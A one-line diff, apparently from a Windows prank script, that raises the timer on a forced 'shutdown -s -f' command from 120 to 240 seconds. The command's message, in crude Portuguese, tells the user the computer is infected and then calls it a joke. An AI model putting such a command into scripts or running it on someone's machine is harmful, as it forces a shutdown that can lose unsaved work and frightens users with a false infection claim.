@@ -1,1 +1,1 @@
-shutdown -s -f -t: 120 -c "Computador infectado huhuhhuhuhuhueueheuhuheheu, brincadeirinha, dê um taskkill nessa porra ou so espere mermo, faz nada n"
+shutdown -s -f -t: 240 -c "Computador infectado huhuhhuhuhuhueueheuhuheheu, brincadeirinha, dê um taskkill nessa porra ou so espere mermo, faz nada n"
